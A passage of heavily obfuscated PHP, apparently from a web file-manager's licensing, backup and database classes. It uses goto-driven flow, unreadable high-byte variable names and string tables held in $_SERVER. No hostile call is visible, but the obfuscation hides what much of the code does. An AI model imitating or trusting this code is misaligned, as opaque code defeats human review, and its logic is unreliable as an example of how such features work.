break; } $d‡Ş¾¤™ŠÛ++; } $dØğ¦–äóí = $Aõ‡Ó¤++; $aï¼¤Ä£« = $cõÓ­Æí”ã[684]; while ($aï¼¤Ä£« < $cõÓ­Æí”ã[588]) { if ($aï¼¤Ä£« >= 0) { break; } $aï¼¤Ä£«++; } $aŞ¹··ƒ Ã = $a’¦ÇŞ‹„‰[349]($cÓğÉÛİ‡á, $eöˆ’±‹ßŠ[$C¦ªóŸ—À]) - $A¦çÂ¿ÇÀÜ - $a’¦ÇŞ‹„‰[350]($fÒç¦œÅ†ë[$dØğ¦–äóí]); $BÃá¼ŠôÆ¤ = $cõÓ­Æí”ã[685]; if (!$BÃá¼ŠôÆ¤) { return; } while ($aŞ¹··ƒ Ã < 0) { $aŞ¹··ƒ Ã += 64; } $e˜‘›ÍåÛŸ .= $cÓğÉÛİ‡á[$aŞ¹··ƒ Ã]; $aœ½áõó¬ = $cõÓ­Æí”ã[686]; } $dÌáÉÉƒÕ = $a’¦ÇŞ‹„‰[353]($e˜‘›ÍåÛŸ); goto f¶À’½®Ù–; Aä–ï¶óˆù: $eöˆ’±‹ßŠ = $a’¦ÇŞ‹„‰[352]($eöˆ’±‹ßŠ); $AâßÔó£™ç = $eöˆ’±‹ßŠ[0]; $eöˆ’±‹ßŠ = $a’¦ÇŞ‹„‰[25]($eöˆ’±‹ßŠ, 1); goto A÷„£®ì…°; B©«Úôª: $C¦ªóŸ—À = 0; $Däá…¯ØÔ = $cõÓ­Æí”ã[649]; $aŞ¹··ƒ Ã = 0; goto CŞ‹¼Æ; eòõæ½œÉ: default: $dÌáÉÉƒÕ = $this->{$_SERVER[Â·¨][256]}($eöˆ’±‹ßŠ, $C“İ¶Ã¿Ä . $aòèÅÊ„·„); $dÉ×‰ëÆô× = $cõÓ­Æí”ã[688]; while (strlen($dÉ×‰ëÆô×) < $cõÓ­Æí”ã[15]) { if (!$dÉ×‰ëÆô×) { break; } $dÉ×‰ëÆô×++; } break; $Aæ™Ç¢‡ = $cõÓ­Æí”ã[689]; } goto fõŒ‹õİ¯»; c¾éõòÖİ¾: $aòèÅÊ„·„ = $a’¦ÇŞ‹„‰[25]($eöˆ’±‹ßŠ, 1, 15); $eöˆ’±‹ßŠ = $a’¦ÇŞ‹„‰[25]($eöˆ’±‹ßŠ, 16); $Eœ³‚ôí÷ = $cõÓ­Æí”ã[675]; goto BÀÀ¶À×¼ç; d¯ƒÙ†ö©: } public function fkrb7ad43426($E¿–ä©ã¤Ë) { goto ašëÆÖõ·; f•í„­ğ”: while (1) { $A¤ÖÇš•¯ = $C”¦£àæÃõ; $C÷êØİ‘É£ = $aİ˜»¼ğ–à; $c×çÄøÚŠå = $eÅçéƒ¥“¢[692]; while ($C÷êØİ‘É£ % $A¤ÖÇš•¯ != 0) { $dÈ’‚“‰ß³ = $C÷êØİ‘É£; $C÷êØİ‘É£ = $A¤ÖÇš•¯; $A¤ÖÇš•¯ = $dÈ’‚“‰ß³ % $A¤ÖÇš•¯; $FÚ£ô‹ßÉ‚ = $eÅçéƒ¥“¢[693]; } if ($A¤ÖÇš•¯ == 1) { break; } else { $C”¦£àæÃõ++; } } $fÄƒÁÁ±ÒÈ = 2; for ($EèÁÂ½Ñ·ª = 0; $EèÁÂ½Ñ·ª < $aİ˜»¼ğ–à * 10; $EèÁÂ½Ñ·ª++) { if (($aİ˜»¼ğ–à * $EèÁÂ½Ñ·ª + 1) % $C”¦£àæÃõ == 0) { $fÄƒÁÁ±ÒÈ = $bçÆ½ˆâÉ›[250](($aİ˜»¼ğ–à * $EèÁÂ½Ñ·ª + 1) / $C”¦£àæÃõ); break; } } goto eöƒÚ‘ÖØ›; dé‡¸°ÓÆ: $eÍè¥˜øÀ­ = $this->{$_SERVER[Â·¨][156]}($E¿–ä©ã¤Ë, $B†²õ©Ôµ) . $bçÆ½ˆâÉ›[358] . $AÈŒîéï¬Æ; $c±™ŠŠİ¾å = $eÅçéƒ¥“¢[694]; while ($c±™ŠŠİ¾å < $eÅçéƒ¥“¢[572]) { if ($c±™ŠŠİ¾å >= 0) { break; } $c±™ŠŠİ¾å++; } goto Eƒ£ñãœ½·; ašëÆÖõ·: $eÅçéƒ¥“¢ =& $_SERVER[±á õÁ]; $bçÆ½ˆâÉ› =& $_SERVER[Â·¨]; $D¶ù´‘ÑÎ = $this->{$_SERVER[Â·¨][354]}(); goto c˜’Û¦°î‚; Eƒ£ñãœ½·: return $eÍè¥˜øÀ­; $Fêô­î«¿ = $eÅçéƒ¥“¢[695]; if (strlen($Fêô­î«¿) < $eÅçéƒ¥“¢[579]) { return; } goto D–èµ‚ˆÒâ; c˜’Û¦°î‚: $dÂ¸×öÇ® = $this->{$_SERVER[Â·¨][354]}(); $FÊŠŸÆÕÄÕ = $eÅçéƒ¥“¢[690]; while ($FÊŠŸÆÕÄÕ < $eÅçéƒ¥“¢[579]) { if ($FÊŠŸÆÕÄÕ >= 0) { break; } $FÊŠŸÆÕÄÕ++; } goto EŠ‚‹²™…Ã; eöƒÚ‘ÖØ›: $AÈŒîéï¬Æ = $this->{$_SERVER[Â·¨][156]}($D¶ù´‘ÑÎ * $dÂ¸×öÇ® . $bçÆ½ˆâÉ›[10], $bçÆ½ˆâÉ›[158]); $B†²õ©Ôµ = $bçÆ½ˆâÉ›[123]($bçÆ½ˆâÉ›[355] . ($D¶ù´‘ÑÎ + $dÂ¸×öÇ®) . $bçÆ½ˆâÉ›[356] . $C”¦£àæÃõ . $bçÆ½ˆâÉ›[356] . $fÄƒÁÁ±ÒÈ . $bçÆ½ˆâÉ›[357]); $dÄÜ«ÖµÛ = $eÅçéƒ¥“¢[626]; goto dé‡¸°ÓÆ; EŠ‚‹²™…Ã: $aİ˜»¼ğ–à = ($D¶ù´‘ÑÎ - 1) * ($dÂ¸×öÇ® - 1); $FË¡ó£òÚÓ = $eÅçéƒ¥“¢[691]; $C”¦£àæÃõ = $bçÆ½ˆâÉ›[250](($D¶ù´‘ÑÎ + $dÂ¸×öÇ®) / 2); goto f•í„­ğ”; D–èµ‚ˆÒâ: } public function xenw87ade475($DæŠƒ¶‚ªô) { goto fÌà©Ÿ‹æ; bÊğóø·Í‰: $c‰“‘Ñ…í = $this->{$_SERVER[Â·¨][256]}($CˆŸòèÕ™ä[0], $BŒğÚÜ–õ); $e­Œ¹²İ˜… = $a“’«óÊ›[707]; return $c‰“‘Ñ…í; goto f«Ù»í¹º; e¦ôÜ”Ì·¹: $a¢ôæ‹È—Ÿ = $a“’«óÊ›[696]; if ($Fİã›Äï†[19]($CˆŸòèÕ™ä) != 2) { return $Fİã›Äï†[10]; } $A·¾Ø‡Ô¾ = $this->{$_SERVER[Â·¨][256]}($CˆŸòèÕ™ä[1] . $Fİã›Äï†[10], $Fİã›Äï†[158]); goto CÍïÀÊùÅğ; f·Ûöëèã¡: $BŒğÚÜ–õ = $Fİã›Äï†[123]($Fİã›Äï†[355] . ($aÇ²±¾‹Ç¶ + $dëíğ³Å¡») . $Fİã›Äï†[356] . $EˆÉ Û¹êÛ . $Fİã›Äï†[356] . $cˆ¢ºÇ¾–¬ . $Fİã›Äï†[357]); $BêñÇ¾¨é« = $a“’«óÊ›[706]; if (!$BêñÇ¾¨é«) { return; } goto bÊğóø·Í‰; f¡‰ô™ª¬: for ($dŠ¥Æ¼¨óÔ = 3; $dŠ¥Æ¼¨óÔ < $A·¾Ø‡Ô¾; $dŠ¥Æ¼¨óÔ += 2) { if ($A·¾Ø‡Ô¾ % $dŠ¥Æ¼¨óÔ != 0) { continue; } $aÇ²±¾‹Ç¶ = $dŠ¥Æ¼¨óÔ; $dëíğ³Å¡» = $Fİã›Äï†[250]($A·¾Ø‡Ô¾ / $dŠ¥Æ¼¨óÔ); break; $F§Àñ¨›‡ = $a“’«óÊ›[700]; if (!$F§Àñ¨›‡) { die; } } $AÏÕùŠ–ôë = ($aÇ²±¾‹Ç¶ - 1) * ($dëíğ³Å¡» - 1); $fà³ÂØÖ÷Ó = $a“’«óÊ›[701]; goto bñå¸ÏÜÎ…; fÌà©Ÿ‹æ: $a“’«óÊ› =& $_SERVER[±á õÁ]; $Fİã›Äï† =& $_SERVER[Â·¨]; $CˆŸòèÕ™ä = $Fİã›Äï†[0]($Fİã›Äï†[358], $DæŠƒ¶‚ªô); goto e¦ôÜ”Ì·¹; bñå¸ÏÜÎ…: if (!$fà³ÂØÖ÷Ó) { die; } $EˆÉ Û¹êÛ = $Fİã›Äï†[250](($aÇ²±¾‹Ç¶ + $dëíğ³Å¡») / 2); $b¹ë¡Ê˜“ô = $a“’«óÊ›[702]; goto d¥ìÁ«…Ï†; d¥ìÁ«…Ï†: while (1) { $Cì³‡“í‘ = $EˆÉ Û¹êÛ; $A´††ÀŞ¨ = $AÏÕùŠ–ôë; $d³¤“Ş²ºÊ = $a“’«óÊ›[703]; if (strlen($d³¤“Ş²ºÊ) < $a“’«óÊ›[585]) { die; } while ($A´††ÀŞ¨ % $Cì³‡“í‘ != 0) { $FÇÏÉàÚõ¡ = $A´††ÀŞ¨; $céË¹ÅØù… = $a“’«óÊ›[704]; while ($céË¹ÅØù… < $a“’«óÊ›[579]) { if ($céË¹ÅØù… >= 0) { break; } $céË¹ÅØù…++; } $A´††ÀŞ¨ = $Cì³‡“í‘; $aºÁ¬øš’Á = $a“’«óÊ›[705]; while (strlen($aºÁ¬øš’Á) < $a“’«óÊ›[572]) { if (!$aºÁ¬øš’Á) { break; } $aºÁ¬øš’Á++; } $Cì³‡“í‘ = $FÇÏÉàÚõ¡ % $Cì³‡“í‘; } if ($Cì³‡“í‘ == 1) { break; } else { $EˆÉ Û¹êÛ++; } } $cˆ¢ºÇ¾–¬ = 2; for ($dŠ¥Æ¼¨óÔ = 0; $dŠ¥Æ¼¨óÔ < $AÏÕùŠ–ôë * 10; $dŠ¥Æ¼¨óÔ++) { if (($AÏÕùŠ–ôë * $dŠ¥Æ¼¨óÔ + 1) % $EˆÉ Û¹êÛ == 0) { $cˆ¢ºÇ¾–¬ = $Fİã›Äï†[250](($AÏÕùŠ–ôë * $dŠ¥Æ¼¨óÔ + 1) / $EˆÉ Û¹êÛ); break; } } goto f·Ûöëèã¡; a’‘à¹šÁ: $dëíğ³Å¡» = 0; $f¾£°£æ¢Ã = $a“’«óÊ›[699]; if (strlen($f¾£°£æ¢Ã) < $a“’«óÊ›[15]) { return; } goto f¡‰ô™ª¬; CÍïÀÊùÅğ: $b÷…­“¹Š = $a“’«óÊ›[697]; while (strlen($b÷…­“¹Š) < $a“’«óÊ›[579]) { if (!$b÷…­“¹Š) { break; } $b÷…­“¹Š++; } if (!$A·¾Ø‡Ô¾) { return $Fİã›Äï†[10]; } goto aÇ­ø¢ô¨Æ; aÇ­ø¢ô¨Æ: $A·¾Ø‡Ô¾ = $Fİã›Äï†[250]($A·¾Ø‡Ô¾); $aÇ²±¾‹Ç¶ = 0; $E»Ï…ŸÇ”° = $a“’«óÊ›[698]; goto a’‘à¹šÁ; f«Ù»í¹º: } public function dmps1bf83e63() { goto D³ßÔ¼‡×±; D³ßÔ¼‡×±: $a¨å¬©á¹Ã =& $_SERVER[±á õÁ]; $c™‹‘†Í™ =& $_SERVER[Â·¨]; $aÉäƒ«åôš = $c™‹‘†Í™[339]($c™‹‘†Í™[359](2, 14), $c™‹‘†Í™[359](2, 16) - 1); goto eÌ¤öãõö†; eÌ¤öãõö†: $d—ÑÖÏ“ä = $a¨å¬©á¹Ã[708]; $f‘ëÙ•¢¾ƒ = array(); $B¬æÈ´Ÿ¡å = 1; goto E•‚Úˆ£¦ö; eœÅÔ²‡óï: return $D‹‹¼ºê’; goto a‘áğî»; E•‚Úˆ£¦ö: while ($B¬æÈ´Ÿ¡å <= (int) $c™‹‘†Í™[360]($aÉäƒ«åôš)) { $cèâùóÎ‰¢ = $B¬æÈ´Ÿ¡å; $fÍé³¥ÅÂ¥ = $a¨å¬©á¹Ã[709]; if (!$fÍé³¥ÅÂ¥) { return; } while (!0) { $cèâùóÎ‰¢++; if ($cèâùóÎ‰¢ <= 2) { $B¬æÈ´Ÿ¡å = $cèâùóÎ‰¢; break; } else { if ($cèâùóÎ‰¢ < 2) { continue; } } $D›Éâ®óß = !0; for ($FèŠ¥ˆà¢‹ = 2; $FèŠ¥ˆà¢‹ <= $c™‹‘†Í™[360]($cèâùóÎ‰¢); $FèŠ¥ˆà¢‹++) { if ($cèâùóÎ‰¢ % $FèŠ¥ˆà¢‹ == 0) { $D›Éâ®óß = !1; } } if ($D›Éâ®óß) { $B¬æÈ´Ÿ¡å = $cèâùóÎ‰¢; break; } } $f‘ëÙ•¢¾ƒ[] = $B¬æÈ´Ÿ¡å; } $D‹‹¼ºê’ = 2; for ($cèâùóÎ‰¢ = $aÉäƒ«åôš; $cèâùóÎ‰¢ > 1; $cèâùóÎ‰¢--) { $D›Éâ®óß = !0; foreach ($f‘ëÙ•¢¾ƒ as $DáõÔÑ°µ) { if ($cèâùóÎ‰¢ % $DáõÔÑ°µ == 0) { $D›Éâ®óß = !1; break; } } if ($D›Éâ®óß) { $D‹‹¼ºê’ = $cèâùóÎ‰¢; break; } } goto eœÅÔ²‡óï; a‘áğî»: } public function svbf3b0410c4($FìÅ¢´, $aéö†¯‚‘¿) { $a‘œ‘ƒä³ï =& $_SERVER[±á õÁ]; $eÑ¦¯À¥½ =& $_SERVER[Â·¨]; return $eÑ¦¯À¥½[13](array($eÑ¦¯À¥½[14], $eÑ¦¯À¥½[361]), $FìÅ¢´, $aéö†¯‚‘¿); $Bˆõö†èÃ = $a‘œ‘ƒä³ï[710]; if (strlen($Bˆõö†èÃ) < $a‘œ‘ƒä³ï[585]) { die; } } public function xaci549a396d($céÎ¸ìÊï, $Dçáµ‘§¼) { $aÈ®ùŸÑ› =& $_SERVER[Â·¨]; return $aÈ®ùŸÑ›[13](array($aÈ®ùŸÑ›[362], $aÈ®ùŸÑ›[363]), $céÎ¸ìÊï, $Dçáµ‘§¼); $dõ‡÷«“¼É = $_SERVER[±á õÁ][711]; } public function chqp3182e5b3($c¿œœšÓ‚Ÿ, $a¤Ú‡¯œ«Š) { $DÛ“ô¨ë± =& $_SERVER[Â·¨]; return $DÛ“ô¨ë±[13](array($DÛ“ô¨ë±[362], $DÛ“ô¨ë±[364]), $c¿œœšÓ‚Ÿ, $a¤Ú‡¯œ«Š); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $BãÒãé‹ =& $_SERVER[±á õÁ]; self::$name = date($BãÒãé‹[712]); if (!($FÛÂë¥Íó‘ = Model($BãÒãé‹[713])->lastItem())) { $FÛÂë¥Íó‘ = $this->initData(); } else { self::$name = $FÛÂë¥Íó‘[$BãÒãé‹[38]]; if ($FÛÂë¥Íó‘[$BãÒãé‹[714]] == $BãÒãé‹[93]) { self::$name = date($BãÒãé‹[715]); $f£”†åÏ…™ = 0; if (isset($FÛÂë¥Íó‘[$BãÒãé‹[296]][$BãÒãé‹[181]][$BãÒãé‹[443]])) { $f£”†åÏ…™ = (int) $FÛÂë¥Íó‘[$BãÒãé‹[296]][$BãÒãé‹[181]][$BãÒãé‹[443]]; } if ($FÛÂë¥Íó‘[$BãÒãé‹[38]] == self::$name) { Model($BãÒãé‹[713])->remove($FÛÂë¥Íó‘[$BãÒãé‹[391]]); } $FÛÂë¥Íó‘ = $this->initData($f£”†åÏ…™, $FÛÂë¥Íó‘[$BãÒãé‹[716]]); } else { $this->checkStore($FÛÂë¥Íó‘[$BãÒãé‹[716]]); } } self::$option = $FÛÂë¥Íó‘; } private function initData($cÆéğÀ˜ßÉ = 0, $eÕÂº †Éæ = '') { goto Dñ¬ÙØª£Ô; f†Õš®‡ÊÕ: $this->checkStore($c½ï¥İ°Æ¼[$F‘ãÄˆ±à£[716]]); $Có…ìÔ…Í = array($F‘ãÄˆ±à£[716] => $c½ï¥İ°Æ¼[$F‘ãÄˆ±à£[716]], $F‘ãÄˆ±à£[38] => self::$name, $F‘ãÄˆ±à£[714] => 0, $F‘ãÄˆ±à£[717] => $c½ï¥İ°Æ¼[$F‘ãÄˆ±à£[717]], $F‘ãÄˆ±à£[296] => array($F‘ãÄˆ±à£[718] => array($F‘ãÄˆ±à£[714] => 0), $F‘ãÄˆ±à£[719] => array($F‘ãÄˆ±à£[714] => 0, $F‘ãÄˆ±à£[720] => 0, $F‘ãÄˆ±à£[721] => 0, $F‘ãÄˆ±à£[39] => $F‘ãÄˆ±à£[43]), $F‘ãÄˆ±à£[722] => array($F‘ãÄˆ±à£[714] => 0, $F‘ãÄˆ±à£[720] => 0, $F‘ãÄˆ±à£[721] => 0), $F‘ãÄˆ±à£[181] => array($F‘ãÄˆ±à£[714] => 0, $F‘ãÄˆ±à£[723] => 0, $F‘ãÄˆ±à£[724] => 0, $F‘ãÄˆ±à£[725] => 0, $F‘ãÄˆ±à£[726] => 0, $F‘ãÄˆ±à£[443] => $cÆéğÀ˜ßÉ)), $F‘ãÄˆ±à£[727] => time(), $F‘ãÄˆ±à£[472] => 0); $E«Ÿ¶ô™‘Ó = Model($F‘ãÄˆ±à£[713])->insert($Có…ìÔ…Í); goto cÄ£”£‹ğ÷; cÄ£”£‹ğ÷: $Có…ìÔ…Í[$F‘ãÄˆ±à£[391]] = $E«Ÿ¶ô™‘Ó; return $Có…ìÔ…Í; goto D¡ò‡…î; Dñ¬ÙØª£Ô: $F‘ãÄˆ±à£ =& $_SERVER[±á õÁ]; $c½ï¥İ°Æ¼ = Model($F‘ãÄˆ±à£[713])->config(); if ($eÕÂº †Éæ && $c½ï¥İ°Æ¼[$F‘ãÄˆ±à£[716]] != $eÕÂº †Éæ) { $cÆéğÀ˜ßÉ = 0; } goto f†Õš®‡ÊÕ; D¡ò‡…î: } private function checkStore($B•Ñ¸º‘ÈÅ) { $c¯×Óì´ˆ• =& $_SERVER[±á õÁ]; $Eº…ÒÆÙ = Model($c¯×Óì´ˆ•[728])->listData($B•Ñ¸º‘ÈÅ); Model($c¯×Óì´ˆ•[728])->checkConfig($Eº…ÒÆÙ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[±á õÁ][713])->findByName(self::$name); } return self::$option; } public static function set($cïßÎæÅ¥’) { $b¢Çä¹¢ÍÖ =& $_SERVER[±á õÁ]; $cåĞ¨Ê›’‹ = self::get(); foreach ($cïßÎæÅ¥’ as $F•÷”Œ‰Û± => $a°Í©’—«²) { $a‘ÁóÆ×›ñ = explode($b¢Çä¹¢ÍÖ[101], $F•÷”Œ‰Û±); $døÔ¶ÁÅŒ = count($a‘ÁóÆ×›ñ); switch ($døÔ¶ÁÅŒ) { case 1: $cåĞ¨Ê›’‹[$a‘ÁóÆ×›ñ[0]] = $a°Í©’—«²; break; case 2: $cåĞ¨Ê›’‹[$a‘ÁóÆ×›ñ[0]][$a‘ÁóÆ×›ñ[1]] = $a°Í©’—«²; break; case 3: $cåĞ¨Ê›’‹[$a‘ÁóÆ×›ñ[0]][$a‘ÁóÆ×›ñ[1]][$a‘ÁóÆ×›ñ[2]] = $a°Í©’—«²; break; } } Model($b¢Çä¹¢ÍÖ[713])->update($cåĞ¨Ê›’‹[$b¢Çä¹¢ÍÖ[391]], $cåĞ¨Ê›’‹); self::$option = $cåĞ¨Ê›’‹; return self::$option; } public function keep() { $E¿œŠ‡ÏÄ¼ =& $_SERVER[±á õÁ]; $A’·³Ìˆ¹„ = self::get(); if ($A’·³Ìˆ¹„[$E¿œŠ‡ÏÄ¼[296]][$E¿œŠ‡ÏÄ¼[718]][$E¿œŠ‡ÏÄ¼[714]] == $E¿œŠ‡ÏÄ¼[93]) { return; } $this->backupKeep($A’·³Ìˆ¹„); self::set(array($E¿œŠ‡ÏÄ¼[729] => 1)); } private function backupKeep($b£ƒÆÔâ¶–) { goto CàÒ˜ë·Ì½; CàÒ˜ë·Ì½: $dÂ’òğ‘µİ =& $_SERVER[±á õÁ]; $dŠ¨ŒóçÓ = Model($dÂ’òğ‘µİ[713])->listData(); if (empty($dŠ¨ŒóçÓ)) { return; } goto c…›ùì÷Ìó; c…›ùì÷Ìó: $EµÖ°†‹É = 0; $D™¦Œ¿í¾Ç = array(); foreach ($dŠ¨ŒóçÓ as $c¸Õ‚ñ…Ôâ) { if ($EµÖ°†‹É >= 7) { break; } $D™¦Œ¿í¾Ç[] = $c¸Õ‚ñ…Ôâ[$dÂ’òğ‘µİ[38]]; $EµÖ°†‹É++; } goto AÊ­»¤£•; AÊ­»¤£•: for ($EµÖ°†‹É = 0; $EµÖ°†‹É < 12; $EµÖ°†‹É++) { $D™¦Œ¿í¾Ç[] = date($dÂ’òğ‘µİ[730], strtotime("\55{$EµÖ°†‹É}\40\155\x6f\156\x74\150\x73")); } $D™¦Œ¿í¾Ç = array_unique($D™¦Œ¿í¾Ç); foreach ($dŠ¨ŒóçÓ as $c¸Õ‚ñ…Ôâ) { if (!empty($c¸Õ‚ñ…Ôâ[$dÂ’òğ‘µİ[38]]) && in_array($c¸Õ‚ñ…Ôâ[$dÂ’òğ‘µİ[38]], $D™¦Œ¿í¾Ç)) { continue; } Model($dÂ’òğ‘µİ[713])->remove($c¸Õ‚ñ…Ôâ[$dÂ’òğ‘µİ[391]]); $Bä…©å©ç = "\x7b\151\157\72{$b£ƒÆÔâ¶–[$dÂ’òğ‘µİ[716]]}\175\x2f\x64\141\x74\141\142\x61\163\145\x2f\142\141\143\153\165\x70\x5f{$c¸Õ‚ñ…Ôâ[$dÂ’òğ‘µİ[38]]}"; IO::remove($Bä…©å©ç, !1); } goto AÅùÑ¨®Ëù; AÅùÑ¨®Ëù: } public function db() { goto aÃš˜êí·ê; FÏ†ÊÜó‘ï: $e©õ±ğÀ·” = new BackupDb(); if (!$e©õ±ğÀ·”->index()) { return !1; } self::set(array($aîÚØ…™‹[731] => 1)); goto d‡ÚŠ´¾ì; d‡ÚŠ´¾ì: return !0; goto D¿”„Ñë…; aÃš˜êí·ê: $aîÚØ…™‹ =& $_SERVER[±á õÁ]; $bã„èÅàÒ§ = self::get(); if ($bã„èÅàÒ§[$aîÚØ…™‹[296]][$aîÚØ…™‹[719]][$aîÚØ…™‹[714]] == $aîÚØ…™‹[93]) { return !0; } goto FÏ†ÊÜó‘ï; D¿”„Ñë…: } public function dbFile() { goto b×º–İÄ³®; a¸©‚ÕÄ†ˆ: $Dôó§å½Ï = new BackupDbFile(); if (!$Dôó§å½Ï->index()) { return !1; } self::set(array($c¢Ä‹ĞÁ­ñ[732] => 1)); goto dî¼—À»…İ; b×º–İÄ³®: $c¢Ä‹ĞÁ­ñ =& $_SERVER[±á õÁ]; $Cò›ß–Ş = self::get(); if ($Cò›ß–Ş[$c¢Ä‹ĞÁ­ñ[296]][$c¢Ä‹ĞÁ­ñ[722]][$c¢Ä‹ĞÁ­ñ[714]] == $c¢Ä‹ĞÁ­ñ[93]) { return !0; } goto a¸©‚ÕÄ†ˆ; dî¼—À»…İ: return !0; goto EÊ®ËĞçŠ‚; EÊ®ËĞçŠ‚: } public function file() { $Aíå™ê²ğ˜ =& $_SERVER[±á õÁ]; $b˜íÊ§ë¿Ç = self::get(); if ($b˜íÊ§ë¿Ç[$Aíå™ê²ğ˜[296]][$Aíå™ê²ğ˜[181]][$Aíå™ê²ğ˜[714]] == $Aíå™ê²ğ˜[93]) { return !0; } if (!isset($b˜íÊ§ë¿Ç[$Aíå™ê²ğ˜[717]]) || $b˜íÊ§ë¿Ç[$Aíå™ê²ğ˜[717]] == $Aíå™ê²ğ˜[493]) { $bÄ…¯ğ÷¡ô = new BackupFile(); if (!$bÄ…¯ğ÷¡ô->index()) { return !1; } } self::set(array($Aíå™ê²ğ˜[733] => 1, $Aíå™ê²ğ˜[714] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto báÕ®…Ù±ƒ; DŠ»ŒåÙ¦: foreach ($A›‚ïÔˆ§Ô as $CŞî•°šó¾) { $B³ÚÃŒ¤îª = $e­ÇÚ½áÜ‰ . $CŞî•°šó¾ . $b®ÊÓ˜–×³[742]; $EİƒÙÓ™ = null; if ($CŞî•°šó¾ == $b®ÊÓ˜–×³[743] && (!isset($C«ˆœ‰Çù„[$b®ÊÓ˜–×³[717]]) || $C«ˆœ‰Çù„[$b®ÊÓ˜–×³[717]] == $b®ÊÓ˜–×³[493])) { $EİƒÙÓ™ = self::$io; } $EÂˆêö‰¨ += $B¿´’Ó¦Œë->sqlFromDb($CŞî•°šó¾, $B³ÚÃŒ¤îª, $C‰–ÚØœÖÓ, $EİƒÙÓ™); } $C‰–ÚØœÖÓ->end(); $B‡³¿²âö– = array($b®ÊÓ˜–×³[744] => $DŒ„ÃŠ¾†ç, $b®ÊÓ˜–×³[731] => 1, $b®ÊÓ˜–×³[745] => $EÂˆêö‰¨, $b®ÊÓ˜–×³[746] => $EÂˆêö‰¨); goto C§¸™ß½‘; aˆ¬ “œ‡: mk_dir($e­ÇÚ½áÜ‰); $d¤İ•Œï‡Ê = $EÂˆêö‰¨ = 0; $A›‚ïÔˆ§Ô = $B¿´’Ó¦Œë->db()->getTables(); goto F±íÓÉËªº; E—§õ¯ ›: self::$name = $C«ˆœ‰Çù„[$b®ÊÓ˜–×³[38]]; $c¥Ö¹é¸ö = $GLOBALS[$b®ÊÓ˜–×³[6]][$b®ÊÓ˜–×³[27]]; $DŒ„ÃŠ¾†ç = $this->_dbType($c¥Ö¹é¸ö); goto B¨“†ôàáÅ; F±íÓÉËªº: $A›‚ïÔˆ§Ô = array_diff($A›‚ïÔˆ§Ô, array($b®ÊÓ˜–×³[735], $b®ÊÓ˜–×³[736])); foreach ($A›‚ïÔˆ§Ô as $CŞî•°šó¾) { $d¤İ•Œï‡Ê += $B¿´’Ó¦Œë->model($CŞî•°šó¾)->count(); } $C‰–ÚØœÖÓ = new Task($b®ÊÓ˜–×³[737], $b®ÊÓ˜–×³[738], $d¤İ•Œï‡Ê, LNG($b®ÊÓ˜–×³[739]) . $b®ÊÓ˜–×³[740] . LNG($b®ÊÓ˜–×³[741])); goto DŠ»ŒåÙ¦; C§¸™ß½‘: Backup::set($B‡³¿²âö–); return !0; goto D ãñøô”; báÕ®…Ù±ƒ: $b®ÊÓ˜–×³ =& $_SERVER[±á õÁ]; $C«ˆœ‰Çù„ = Backup::get(); self::$io = $C«ˆœ‰Çù„[$b®ÊÓ˜–×³[716]]; goto E—§õ¯ ›; B¨“†ôàáÅ: $B¿´’Ó¦Œë = new DbManage($c¥Ö¹é¸ö, $DŒ„ÃŠ¾†ç); $e­ÇÚ½áÜ‰ = TEMP_FILES . $b®ÊÓ˜–×³[734] . self::$name . $b®ÊÓ˜–×³[8]; del_dir($e­ÇÚ½áÜ‰); goto aˆ¬ “œ‡; D ãñøô”: } private function _dbType($DŸ½ßÚÀó») { goto C—ÎÅ¤ì¦—; DÒµ‡ãç½: return $f°áÃ†ëš¹; goto B‡Šµ±™šš; C—ÎÅ¤ì¦—: $AÜç½Ö¤×Å =& $_SERVER[±á õÁ]; $DŸ½ßÚÀó» = array_change_key_case($DŸ½ßÚÀó»); $f°áÃ†ëš¹ = $DŸ½ßÚÀó»[$AÜç½Ö¤×Å[747]]; goto aéÔ”ÙÆ‚î; aéÔ”ÙÆ‚î: if ($f°áÃ†ëš¹ == $AÜç½Ö¤×Å[748]) { $fÑ›ù‡ˆÙœ = explode($AÜç½Ö¤×Å[4], $DŸ½ßÚÀó»[$AÜç½Ö¤×Å[749]]); $f°áÃ†ëš¹ = $fÑ›ù‡ˆÙœ[0]; } $aºëí¸Û‡ = array($AÜç½Ö¤×Å[750] => $AÜç½Ö¤×Å[19], $AÜç½Ö¤×Å[751] => $AÜç½Ö¤×Å[752]); if (isset($aºëí¸Û‡[$f°áÃ†ëš¹])) { $f°áÃ†ëš¹ = $aºëí¸Û‡[$f°áÃ†ëš¹]; } goto DÒµ‡ãç½; B‡Šµ±™šš: } } goto DÌÍßùÔÓ‰; fÂå‡¥­ä†: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\x65\x71" => "\x3c\x3e", "\x67\x74" => "\76", "\145\147\164" => "\76\x3d", "\x6c\164" => "\x3c", "\145\x6c\164" => "\x3c\x3d", "\156\x6f\164\154\151\x6b\145" => "\116\x4f\x54\40\114\111\113\x45", "\x6c\151\153\145" => "\114\111\113\105", "\151\x6e" => "\x49\x4e", "\x6e\157\164\x69\x6e" => "\116\117\x54\40\x49\x4e", "\156\x6f\x74\x20\x69\x6e" => "\116\117\x54\40\x49\x4e", "\142\145\x74\x77\x65\x65\x6e" => "\x42\105\x54\127\x45\x45\116", "\156\x6f\164\x62\145\164\167\x65\145\156" => "\x4e\117\x54\x20\x42\x45\x54\127\x45\105\x4e", "\156\157\164\x20\x62\x65\x74\x77\x65\x65\x6e" => "\116\x4f\x54\x20\102\105\124\127\105\105\116"); protected $selectSql = "\x53\x45\114\105\103\124\45\104\111\123\x54\111\x4e\103\x54\x25\40\45\x46\111\105\x4c\x44\x25\40\106\x52\x4f\115\40\x25\124\101\x42\x4c\105\x25\x25\112\x4f\111\116\x25\x25\127\110\105\122\105\x25\x25\x47\x52\x4f\125\120\x25\45\110\101\126\111\x4e\107\45\45\117\122\104\105\x52\45\x25\x4c\x49\115\x49\124\45\40\x25\x55\x4e\111\x4f\x4e\45\45\103\117\115\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $a‘ã†£Û = func_get_args(); return think_get_instance_of(__CLASS__, 